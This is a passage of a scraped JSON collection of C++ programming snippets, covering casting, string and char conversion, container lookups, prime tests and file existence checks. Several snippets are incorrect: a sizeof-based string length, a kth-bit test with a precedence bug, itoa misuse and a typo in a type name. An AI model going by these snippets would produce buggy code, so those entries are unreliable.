    "description": "int main() { \tint a=20 , b= 25 , c= 19;   \tint sum = a + b + c;   \tfloat ave = (float) sum / 3;  //this is called type casting (float) sum    \tcout<<\"Average is : \"<<ave<<endl;   \treturn 0; }\nint main() {   short a = 2000;   int b;   b = (int)a; // c-like cast notation   b = int(a); // functional notation }\nstatic_cast<int>(some_double);\nint(var)\n#include <iostream> using namespace std; int main(){ \tint x = 4; \tint y = 2; \tcout<<\"La divisione dei valori e': \"<<(float)y/x<<endl; }\ncasting\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1401,
    "keyword": null,
    "link": null,
    "title": " casting cpp",
    "description": "int main() {   short a = 2000;   int b;   b = (int)a; // c-like cast notation   b = int(a); // functional notation }\nstatic_cast<int>(some_double);\ncasting\n#include <iostream> using namespace std; int main(){ \tint x = 4; \tint y = 2; \tcout<<\"La divisione dei valori e': \"<<(float)y/x<<endl; }\nstatic_cast: //does implicit conversions between types. void* data; pointer *pData = static_cast<pointer*>(data);  const_cast: //this can be used to remove or add the const to a variable. const char* characters; const_cast<char*>(characters);  reinterpret_cast: //this cast is dangerous since it turns one type directly into another. struct S1 { int a; } s1; int* p1 = reinterpret_cast<int*>(&s1);\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1402,
    "keyword": null,
    "link": null,
    "title": " casting to a double in c++",
    "description": "int a{5},b{2},c{9}; double d = (double)a / (double)b + (double)c;\ndouble x; x = (double) 25;\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1403,
    "keyword": null,
    "link": null,
    "title": " cat and a mouse hackerrank solution in c",
    "description": "#include<bits/stdc++.h> using namespace std;  int main(){      int q;      cin >> q;     for(int i = 0; i < q; i++){         int a,b,c;         cin >> a >> b >> c;         abs(a-c) < abs(b-c) ? cout << \"Cat A\" : abs(b-c) < abs(a-c) ? cout << \"Cat B\" : cout << \"Mouse C\";         cout << endl;     }     return 0; }\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1404,
    "keyword": null,
    "link": null,
    "title": " ceil or first bigger number",
    "description": "Examples of Ceil:  Input : 2.5 Output : 3  Input : -2.1 Output : -2  Input : 2.9 Output : 3\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1405,
    "keyword": null,
    "link": null,
    "title": " ceil value in c++ using formula",
    "description": "(a + b - 1) / b; // this formula works for integer as well. ceil function in c++ takes double type value. To get ceil value for integer division you can simply use this expression without converting your datatype to double type.\n",
    "reg_date": "2021-10-12T11:38:58.000Z"
  },
  {
    "id": 1406,
    "keyword": null,
    "link": null,
    "title": " centos7 mlock2",
    "description": "#define _GNU_SOURCE #include <unistd.h> #include <errno.h> #include <asm-generic/mman-common.h> #include <sys/syscall.h> #include <sys/mman.h>  inline int mlock2(const void* addr, size_t length, unsigned int flags) noexcept {     if (flags == 0)     {         return mlock(addr, length);     }     int ret = syscall(SYS_mlock2, addr, length, flags);     return (ret == 0 || errno != ENOSYS) ? ret : -1; }\n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1407,
    "keyword": null,
    "link": null,
    "title": " centroid of a tree",
    "description": "vector<int> Centroid(const vector<vector<int>> &g) {         int n = g.size();         vector<int> centroid;         vector<int> sz(n);         function<void (int, int)> dfs = [&](int u, int prev) {                 sz[u] = 1;                 bool is_centroid = true;                 for (auto v : g[u]) if (v != prev) {                         dfs(v, u);                         sz[u] += sz[v];                         if (sz[v] > n / 2) is_centroid = false;                 }                 if (n - sz[u] > n / 2) is_centroid = false;                 if (is_centroid) centroid.push_back(u);         };         dfs(0, -1);         return centroid; }\n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1408,
    "keyword": null,
    "link": null,
    "title": " certificate exe application",
    "description": "// Windows Tool Kit // signtool.exe in => <windows kit path>/bin/<version>/signtool.exe signtool sign /a MyFile.exe\n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1409,
    "keyword": null,
    "link": null,
    "title": " chain function calls c++",
    "description": "class foo {   private:     int x;     int y;   public:     foo& setx(int x_)     {   x = x_;         return *this; }     foo& sety(int y_)     {   y = y_;         return *this; }     foo& print()     {std::cout << x << ' ' << y;      return *this;} };  int main() {     foo bar;     bar.setx(1).sety(2).print(); }\n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1410,
    "keyword": null,
    "link": null,
    "title": " change int to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\nint x = 5; string str = to_string(x);\nstring str_val = to_string(int_val);\n#include <iostream>   #include<string>   using namespace std;   int main()   {    int i=11;      string str= to_string(i);      cout<<\"string value of integer i is :\"<<str<<\"\\n\";    return 0; }  \n#include <string> string str = to_string(value);\n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1411,
    "keyword": null,
    "link": null,
    "title": " change int to string cpp",
    "description": "#include <string>   std::string s = std::to_string(42);\nint x = 5; string str = to_string(x);\nstd::to_string(23213.123)\nint a = 10; char *intStr = itoa(a); string str = string(intStr);\n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1412,
    "keyword": null,
    "link": null,
    "title": " change integer to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\nstd::to_string(23213.123)\nstring str_val = to_string(int_val);\n#include <string>   std::string s = std::to_string(42); \n",
    "reg_date": "2021-10-12T11:38:59.000Z"
  },
  {
    "id": 1413,
    "keyword": null,
    "link": null,
    "title": " changing key bindings in visual code not working",
    "description": "see the link\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1414,
    "keyword": null,
    "link": null,
    "title": " char* to int in cpp",
    "description": "int x = std::stoi(\"42\")\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1415,
    "keyword": null,
    "link": null,
    "title": " char * in c++",
    "description": "#include <iostream> using namespace std; int main() { \tchar grade = 'B'; \tcout << \"I scored a: \"<<grade; \treturn 0; } \n#include <iostream> using namespace std;  int main()  { \tchar* name = \"Raj\";\t//can store a sequence of characters. \tconst char* school = \"oxford\"; \t//school[0] = 'O';\t\t//gives runtime error. We can't modify it. \tcout << name<<\" \"<<school; \t \treturn 0; }\nisdigit() - Check if character is decimal digit  isalpha() - Check if character is alphabetic isblank() - Check if character is blank islower() - Check if character is lowercase letter isupper() - Check if character is uppercase letter isalnum() - Check if character is alphanumeric\nstr.at(index)\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1416,
    "keyword": null,
    "link": null,
    "title": " char * to string c++",
    "description": "// \"std::string\" has a method called \"c_str()\" that returns a \"const char*\" // pointer to its inner memory. You can copy that \"const char*\" to a variable // using \"strcpy()\".  std::string str = \"Hello World\"; char buffer[50];  strcpy(buffer, str.c_str());  std::cout << buffer;\t//Output: Hello World  //POSTED BY eferion ON STACK OVERFLOW (IN SPANISH). \n// example char sczName[] = {\"Jakes\"}; std::string strName = std::string(sczName);  /* SYNTAX #include <string> std::string(<char-to-convert>) */\nstd::cout << std::string(1, c) << std::endl;\nchar *cStr = \"C++\"; std::string Str = std::string(cStr);\n#include <iostream> using namespace std;  int main() {   char c = 'l';   string str;   str.push_back(c); }\nconst char *s = \"Hello, World!\"; std::string str(s); \n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1417,
    "keyword": null,
    "link": null,
    "title": " char at in c++",
    "description": "#include <iostream> using namespace std; int main() { \tchar grade = 'B'; \tcout << \"I scored a: \"<<grade; \treturn 0; } \n#include <iostream> using namespace std;  int main()  { \tchar* name = \"Raj\";\t//can store a sequence of characters. \tconst char* school = \"oxford\"; \t//school[0] = 'O';\t\t//gives runtime error. We can't modify it. \tcout << name<<\" \"<<school; \t \treturn 0; }\nstr.at(index)\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1418,
    "keyword": null,
    "link": null,
    "title": " char c++",
    "description": "#include <iostream>  using namespace std;  int main() {   wcout << (wchar_t)0x41 << endl;   return 0; }\n#include <iostream> using namespace std; int main() { \tchar grade = 'B'; \tcout << \"I scored a: \"<<grade; \treturn 0; } \n#include <iostream> using namespace std;  int main()  { \tchar* name = \"Raj\";\t//can store a sequence of characters. \tconst char* school = \"oxford\"; \t//school[0] = 'O';\t\t//gives runtime error. We can't modify it. \tcout << name<<\" \"<<school; \t \treturn 0; }\nisdigit() - Check if character is decimal digit  isalpha() - Check if character is alphabetic isblank() - Check if character is blank islower() - Check if character is lowercase letter isupper() - Check if character is uppercase letter isalnum() - Check if character is alphanumeric\n// syntax:  // char <variable-name>[] = \"<string/char-you-want-to-store>\";   // example (to store 'Hello!' in the YourVar variable):  char YourVar[] = \"Hello!\"; \n // syntax:  // char <variable-name>[] = { '<1st-char>',  '<2nd-char>', ... , '<Nth-char>', '\\0'};   // example (to store 'Hello' in the YourVar variable):  char YourVar[] = {'H','e','l','l','o','\\0'}; // NOTE: the \\0 marks the end of the char array \n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1419,
    "keyword": null,
    "link": null,
    "title": " char size length c++",
    "description": "char* a = \"ABC\"; int length = sizeof(a)/sizeof(char);\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1420,
    "keyword": null,
    "link": null,
    "title": " char to int in c++",
    "description": "char a = '6'; //bounded by 0 and 9 int n1 = a - '0';  int n2 = a - 48;  int n3 = std::stoi(&a);\nstd::string s = std::to_string(number); char const *pchar = s.c_str();  //use char const* as target type\nint x = std::stoi(\"42\")\nint x = character - '0'\nint x  = '9' - 48; // x now equals 9 as an integer\nchar a = '4'; int ia = a - '0';\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1421,
    "keyword": null,
    "link": null,
    "title": " char to string c++",
    "description": "// example char sczName[] = {\"Jakes\"}; std::string strName = std::string(sczName);  /* SYNTAX #include <string> std::string(<char-to-convert>) */\nstd::cout << std::string(1, c) << std::endl;\nchar *cStr = \"C++\"; std::string Str = std::string(cStr);\n#include <iostream> using namespace std;  int main() {   char c = 'l';   string str;   str.push_back(c); }\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1422,
    "keyword": null,
    "link": null,
    "title": " char type casting in c++",
    "description": "#include <iostream> using namespace std;   int main()        {   cout<< (char)65 <<\"\\n\"; }\n",
    "reg_date": "2021-10-12T11:39:00.000Z"
  },
  {
    "id": 1423,
    "keyword": null,
    "link": null,
    "title": " char vector to string c++",
    "description": "std::vector<char> input({ 'a', 'b', 'c' });  std::string s(input.begin(), input.end()); \n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1424,
    "keyword": null,
    "link": null,
    "title": " character array to string c++ stl",
    "description": "char arr[] = \"mom\"; std::cout << \"hi \" << std::string(arr); \n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1425,
    "keyword": null,
    "link": null,
    "title": " check .h files syntax c++",
    "description": "g++ -c myheader.h\n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1426,
    "keyword": null,
    "link": null,
    "title": " check alphabet c++",
    "description": "isalpha(character) - Check if character is alphabetic \n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1427,
    "keyword": null,
    "link": null,
    "title": " check an stack is empty c++",
    "description": "std::stack <int> st; if(st.empty())   std::cout << \"stack is empty\";\n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1428,
    "keyword": null,
    "link": null,
    "title": " check compiler version c++",
    "description": "#include <iostream> #include <typeinfo>  int main() {     if (__cplusplus == 201703L) std::cout << \"C++17\\n\";     else if (__cplusplus == 201402L) std::cout << \"C++14\\n\";     else if (__cplusplus == 201103L) std::cout << \"C++11\\n\";     else if (__cplusplus == 199711L) std::cout << \"C++98\\n\";     else std::cout << \"pre-standard C++\\n\";  }\n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1429,
    "keyword": null,
    "link": null,
    "title": " check file exist cpp",
    "description": "#include <sys/stat.h> #include <unistd.h> #include <string> #include <fstream>  inline bool exists_test0 (const std::string& name) {     ifstream f(name.c_str());     return f.good(); }  inline bool exists_test1 (const std::string& name) {     if (FILE *file = fopen(name.c_str(), \"r\")) {         fclose(file);         return true;     } else {         return false;     }    }  inline bool exists_test2 (const std::string& name) {     return ( access( name.c_str(), F_OK ) != -1 ); }  inline bool exists_test3 (const std::string& name) {   struct stat buffer;      return (stat (name.c_str(), &buffer) == 0);  } \nMethod exists_test0 (ifstream): **0.485s** Method exists_test1 (FILE fopen): **0.302s** Method exists_test2 (posix access()): **0.202s** Method exists_test3 (posix stat()): **0.134s** \n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1430,
    "keyword": null,
    "link": null,
    "title": " check for GCC compiler and version",
    "description": "g++ --version\n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1431,
    "keyword": null,
    "link": null,
    "title": " check for bst",
    "description": "// C++ program to check if a given tree is BST.  #include <bits/stdc++.h>  using namespace std;   /* A binary tree node has data, pointer to  left child and a pointer to right child */ struct Node  {  \tint data;  \tstruct Node* left, *right;  };   // Returns true if given tree is BST.  bool isBST(Node* root, Node* l=NULL, Node* r=NULL)  {  \t// Base condition  \tif (root == NULL)  \t\treturn true;   \t// if left node exist then check it has  \t// correct data or not i.e. left node's data  \t// should be less than root's data  \tif (l != NULL and root->data <= l->data)  \t\treturn false;   \t// if right node exist then check it has  \t// correct data or not i.e. right node's data  \t// should be greater than root's data  \tif (r != NULL and root->data >= r->data)  \t\treturn false;   \t// check recursively for every node.  \treturn isBST(root->left, l, root) and  \t\tisBST(root->right, root, r);  }   /* Helper function that allocates a new node with the  given data and NULL left and right pointers. */ struct Node* newNode(int data)  {  \tstruct Node* node = new Node;  \tnode->data = data;  \tnode->left = node->right = NULL;  \treturn (node);  }   /* Driver program to test above functions*/ int main()  {  \tstruct Node *root = newNode(3);  \troot->left\t = newNode(2);  \troot->right\t = newNode(5);  \troot->left->left = newNode(1);  \troot->left->right = newNode(4);   \tif (isBST(root,NULL,NULL))  \t\tcout << \"Is BST\";  \telse \t\tcout << \"Not a BST\";   \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:39:01.000Z"
  },
  {
    "id": 1432,
    "keyword": null,
    "link": null,
    "title": " check gpu usage jetson nano",
    "description": "Use this lib https://github.com/rbonghi/jetson_stats#install \n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1433,
    "keyword": null,
    "link": null,
    "title": " check if a key is in a map",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1434,
    "keyword": null,
    "link": null,
    "title": " check if a key is in map c++",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\n#include<map>  int main(){    \tmap<int,char> m;   \t   \tchar ch = '!';    \tif (m.find(ch) != m.end()) { \t\tstd::cout << \"Key found\"; \t} else { \t\tstd::cout << \"Key not found\"; \t}    \treturn 0; }\nif ( m.find(\"f\") == m.end() ) {   // not found } else {   // found } \n#include <iostream> #include <unordered_map> #include <algorithm>   int main() {     std::unordered_map<char,int> m;       std::string s(\"abcba\");     std::for_each(s.begin(), s.end(), [&m](char &c) { m[c]++; });       char ch = 's';       if (m.find(ch) != m.end()) {         std::cout << \"Key found\";     } else {         std::cout << \"Key not found\";     }       return 0; } \n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1435,
    "keyword": null,
    "link": null,
    "title": " check if a string is a prefix of another c++",
    "description": "std::string prefix = \"foo\"; std::string string = \"foobar\";  bool isPrefix = std::mismatch(prefix.begin(), prefix.end(),     string.begin(), string.end()).first == prefix.end(); \n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1436,
    "keyword": null,
    "link": null,
    "title": " check if a string is palindrome cpp",
    "description": "// Check whether the string is a palindrome or not. #include <bits/stdc++.h>  using namespace std;  int main(){     string s;     cin >> s;          int l = 0;     int h = s.length()-1;      while(h > l){         if(s[l++] != s[h--]){             cout << \"Not a palindrome\" << endl;             return 0;         }     }     cout << \"Is a palindrome\" << endl;     return 0;  }\n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1437,
    "keyword": null,
    "link": null,
    "title": " check if a variable is tring c++",
    "description": "\tif (typeid(variable) == typeid(std::string)) { \t\tstd::cout << variable << \" is a string\" << std::endl; \t} \telse { \t\tstd::cout << variable << \" is not a string\" << std::endl; \t}\n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1438,
    "keyword": null,
    "link": null,
    "title": " check if an element exists in a map c++",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\n#include<map>  int main(){    \tmap<int,char> m;   \t   \tchar ch = '!';    \tif (m.find(ch) != m.end()) { \t\tstd::cout << \"Key found\"; \t} else { \t\tstd::cout << \"Key not found\"; \t}    \treturn 0; }\nif ( m.find(\"f\") == m.end() ) {   // not found } else {   // found } \n#include <iostream> #include <unordered_map> #include <algorithm>   int main() {     std::unordered_map<char,int> m;       std::string s(\"abcba\");     std::for_each(s.begin(), s.end(), [&m](char &c) { m[c]++; });       char ch = 's';       if (m.find(ch) != m.end()) {         std::cout << \"Key found\";     } else {         std::cout << \"Key not found\";     }       return 0; } \n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1439,
    "keyword": null,
    "link": null,
    "title": " check if char in string c++",
    "description": "std::string s = \"Hello\"; if (s.find('e') != std::string::npos)     cout << \"Found\"; else     cout << \"Not Found\"; \nstd::string s = \"hell[o\"; if (s.find('[') != std::string::npos)     ; // found else     ; //\n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1440,
    "keyword": null,
    "link": null,
    "title": " check if character in string c++",
    "description": "std::string s = \"hell[o\"; if (s.find('[') != std::string::npos)     ; // found else     ; //\n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1441,
    "keyword": null,
    "link": null,
    "title": " check if character in string is alphabet c++",
    "description": "#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isalpha(val1))    printf(\"The character is an alphabet\\n\");    else    printf(\"The character is not an alphabet\\n\");     if(isalpha(val2))    printf(\"The character is an alphabet\\n\");    else    printf(\"The character is not an alphabet\");     return 0; }\n",
    "reg_date": "2021-10-12T11:39:02.000Z"
  },
  {
    "id": 1442,
    "keyword": null,
    "link": null,
    "title": " check if character in string is digit c++",
    "description": "#include<stdio.h> #include<ctype.h>  int main() {    char val1 = 's';    char val2 = '8';     if(isdigit(val1))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\\n\");     if(isdigit(val2))    printf(\"The character is a digit\\n\");    else    printf(\"The character is not a digit\");     return 0; }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1443,
    "keyword": null,
    "link": null,
    "title": " check if character in string is uppercase c++",
    "description": "if (isupper(str[i])) { \t// str[i] is uppercase }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1444,
    "keyword": null,
    "link": null,
    "title": " check if cin didn't get int",
    "description": "while (std::cout << \"Enter a number\" && !(std::cin >> num)) {     std::cin.clear(); //clear bad input flag     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); //discard input     std::cout << \"Invalid input; please re-enter.\\n\"; }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1445,
    "keyword": null,
    "link": null,
    "title": " check if cin got the wrong type",
    "description": "while (std::cout << \"Enter a number\" && !(std::cin >> num)) {     std::cin.clear(); //clear bad input flag     std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); //discard input     std::cout << \"Invalid input; please re-enter.\\n\"; }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1446,
    "keyword": null,
    "link": null,
    "title": " check if directory exists cpp",
    "description": "#include <sys/stat.h>  bool IsPathExist(const std::string &s) {   struct stat buffer;   return (stat (s.c_str(), &buffer) == 0); } \n#include <sys/stat.h>  int main() { \tstruct stat buffer;     std::string string = \"Hello\";          if (stat(&string.c_str(), &buffer) != 0) {     \tstd::cout << \"'Hello' directory doesn't exist!\";     } else {     \tstd::cout << \"'Hello' directory exists!\";     } }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1447,
    "keyword": null,
    "link": null,
    "title": " check if double is integer c++",
    "description": "double ans;  if(floor(ans) == ceil(ans))\ndouble x = 5.4; int y = (int) x;\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1448,
    "keyword": null,
    "link": null,
    "title": " check if element in std vector",
    "description": "#include <iostream> #include <vector> #include <algorithm>   int main() {     std::vector<int> v = { 4, 7, 5, 2, 6, 9 };     int key = 6;       if (std::count(v.begin(), v.end(), key))         std::cout << \"Element found\";     else         std::cout << \"Element not found\";       return 0; } \n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1449,
    "keyword": null,
    "link": null,
    "title": " check if equal to \\ char or not c++",
    "description": "if (c == '\\\\') {  } \n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1450,
    "keyword": null,
    "link": null,
    "title": " check if float has decimals c++",
    "description": "if (some_float == (int)some_float) { \t// decimal part == 0.0 i.e. no fractional part }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1451,
    "keyword": null,
    "link": null,
    "title": " check if intent has extras",
    "description": "Intent intent = getIntent();  if (intent.hasExtra(\"bookUrl\")) {     bookUrl = b.getString(\"bookUrl\"); } else {    // Do something else }\n",
    "reg_date": "2021-10-12T11:39:03.000Z"
  },
  {
    "id": 1452,
    "keyword": null,
    "link": null,
    "title": " check if key exists in map c++",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\n#include<map>  int main(){    \tmap<int,char> m;   \t   \tchar ch = '!';    \tif (m.find(ch) != m.end()) { \t\tstd::cout << \"Key found\"; \t} else { \t\tstd::cout << \"Key not found\"; \t}    \treturn 0; }\nif ( m.find(\"f\") == m.end() ) {   // not found } else {   // found } \nif ( !(myMap.find(\"key\") == myMap.end()) ) {\t// \"key\" exists\t    } else {\t// not found\t    } \n#include <iostream> #include <unordered_map> #include <algorithm>   int main() {     std::unordered_map<char,int> m;       std::string s(\"abcba\");     std::for_each(s.begin(), s.end(), [&m](char &c) { m[c]++; });       char ch = 's';       if (m.find(ch) != m.end()) {         std::cout << \"Key found\";     } else {         std::cout << \"Key not found\";     }       return 0; } \n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1453,
    "keyword": null,
    "link": null,
    "title": " check if kth bit is set or not code",
    "description": "#include <iostream> using namespace std;  //! Using LeftShift Operator  void kthBit(int n, int k) {     if (n & (1 << k - 1) != 0)     {         cout << \"Yes\" << endl;     }     else     {         cout << \"No\" << endl;     } }  int main() {     int n, k;     cin >> n >> k;     kthBit(n, k);     return 0; }\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1454,
    "keyword": null,
    "link": null,
    "title": " check if line intersects triangle",
    "description": "bool isTriangleIntersecting(vec3d p1,vec3d p2,vec3d p3,vec3d qq1,vec3d qq2) { \t\t\t   //p1 , 2 , 3 are points of triangle   // q1 and q2 defines a line    \t\t\tvec3d q1 = subtractvec(qq1, qq2); \t\t\tq1 = normalize(q1); \t\t\tq1 = multiplicatevec(q1, vec3d{1000,1000,1000}); \t\t\tq1 = addvec(q1, qq1);   \t\t\tvec3d q2 = subtractvec(qq2, qq1); \t\t\tq2 = normalize(q2); \t\t\tq2 = multiplicatevec(q2, vec3d{ 1000,1000,1000 }); \t\t\tq2 = addvec(q2, qq2);    \t\t\tif (GetNaturality(volumeOfTetrahedron(q1, p1, p2, p3)) != GetNaturality(volumeOfTetrahedron(q2, p1, p2, p3))) { \t\t\t\tif (GetNaturality(volumeOfTetrahedron(q1, q2, p1, p2)) == GetNaturality(volumeOfTetrahedron(q1, q2, p2, p3)) && GetNaturality(volumeOfTetrahedron(q1, q2, p2, p3)) == GetNaturality(volumeOfTetrahedron(q1, q2, p3, p1))) { \t\t\t\t\treturn true; \t\t\t\t} \t\t\t} \t\t\treturn false; \t\t}  vec3d normalize(vec3d v) { \t\t\tfloat lenght = sqrt(v.posx * v.posx + v.posy * v.posy + v.posz * v.posz); \t\t\tv.posx /= lenght; \t\t\tv.posy /= lenght; \t\t\tv.posz /= lenght; \t\t\treturn v; \t\t}  float GetNaturality(float f) { \t\t\tif (f == 0) { \t\t\t\treturn 0; \t\t\t} \t\t\treturn f / abs(f); \t\t}  \t\tvec3d multiplicatevec(vec3d origin, vec3d v) { \t\t\torigin.posx *= v.posx; \t\t\torigin.posy *= v.posy; \t\t\torigin.posz *= v.posz; \t\t\treturn origin; \t\t}  \t\tvec3d subtractvec(vec3d origin,vec3d v) { \t\t\torigin.posx -= v.posx; \t\t\torigin.posy -= v.posy; \t\t\torigin.posz -= v.posz; \t\t\treturn origin; \t\t \t\t}  \t\tvec3d addvec(vec3d origin, vec3d v) { \t\t\torigin.posx += v.posx; \t\t\torigin.posy += v.posy; \t\t\torigin.posz += v.posz; \t\t\treturn origin;  \t\t} \n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1455,
    "keyword": null,
    "link": null,
    "title": " check if map key has alue cpp",
    "description": "#include<map>  int main(){    \tmap<int,char> m;   \t   \tchar ch = '!';    \tif (m.find(ch) != m.end()) { \t\tstd::cout << \"Key found\"; \t} else { \t\tstd::cout << \"Key not found\"; \t}    \treturn 0; }\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1456,
    "keyword": null,
    "link": null,
    "title": " check if map key has value cpp",
    "description": "#include<map>  int main(){    \tmap<int,char> m;   \t   \tchar ch = '!';    \tif (m.find(ch) != m.end()) { \t\tstd::cout << \"Key found\"; \t} else { \t\tstd::cout << \"Key not found\"; \t}    \treturn 0; }\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1457,
    "keyword": null,
    "link": null,
    "title": " check if point is left or right of vector",
    "description": "Check position of point M(X, Y) relative to vector AB with points A(Ax, Ay) and B(Bx, By):  position = sign((Bx - Ax) * (Y - Ay) - (By - Ay) * (X - Ax))  M is: \t+1 left, \t\t-1 right,     \t0 on the vector AB\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1458,
    "keyword": null,
    "link": null,
    "title": " check if queue is empty c++",
    "description": "  while (!myqueue.empty())   {      sum += myqueue.front();      myqueue.pop();   }\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1459,
    "keyword": null,
    "link": null,
    "title": " check if set contains element c++",
    "description": "set<T>::iterator it = theSet.find(element); if (it != theSet.end()) {   // The element was found } else {   // The element was not found }\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1460,
    "keyword": null,
    "link": null,
    "title": " check if string in vector c++",
    "description": "#include <algorithm>  if(std::find(v.begin(), v.end(), x) != v.end()) {     /* v contains x */ } else {     /* v does not contain x */ }\nmatch sub string\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1461,
    "keyword": null,
    "link": null,
    "title": " check lowercase letters c++",
    "description": "for(int i=0;i<str.size();i++){ int c = str[i];          if (islower(c))               str[i] = toupper(c); }\nstr[i] = toupper(str[i]);\nif (isupper(str[i])) { \t// str[i] is uppercase }\nstr[i] = tolower(str[i]);\nchar character = 'a'; //0110 0001 if(character & 0x20) { \t//is lowercase }\n",
    "reg_date": "2021-10-12T11:39:04.000Z"
  },
  {
    "id": 1462,
    "keyword": null,
    "link": null,
    "title": " check prime cpp gfg",
    "description": "#include <bits/stdc++.h> #include <math.h> using namespace std;  #define ll long long  bool checkPrime(int number){ \tfor(int i=2; i<=sqrt(number); i++){ \t\tif(number%i==0){ \t\t\treturn false; \t\t} \t} \treturn true; }\n// 6k+-1 optimisation bool is_prime6(int num) {   int i;   if (num == 1)     return false;   if (num <= 3)     return true;   if (num % 2 == 0 || num % 3 == 0)     return false;   if (num < 25)     return true;   for (i = 5; i * i <= num; i += 6)     if (num % i == 0 || num % (i + 2) == 0)       return false;   return true; }\nbool isPrime(int s){    if(s<=1)return false;    if(s==2)return true;    int m = ceil(sqrt(s));    for(int i=2;i<=m;i++){        if(s%i==0){            return false;        }    }    return true; }\n#include <bits/stdc++.h> using namespace std;  #define ll long long bool isPrime(ll number){ \t  for(ll i = 2; i <= number / 2; i++){ \t            \tif(number % i == 0)       {           return false;           break;       }  \t}  \t  \treturn true; }\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1463,
    "keyword": null,
    "link": null,
    "title": " check prime in c++",
    "description": "#include <bits/stdc++.h> #include <math.h> using namespace std;  #define ll long long  bool checkPrime(int number){ \tfor(int i=2; i<=sqrt(number); i++){ \t\tif(number%i==0){ \t\t\treturn false; \t\t} \t} \treturn true; }\n#include <bits/stdc++.h> using namespace std;  #define ll long long bool isPrime(ll number){ \t  for(ll i = 2; i <= number / 2; i++){ \t            \tif(number % i == 0)       {           return false;           break;       }  \t}  \t  \treturn true; }\n",
    "reg_date": "2021-10-12T11:39:05.000Z"
  },
  {
    "id": 1464,
    "keyword": null,
    "link": null,
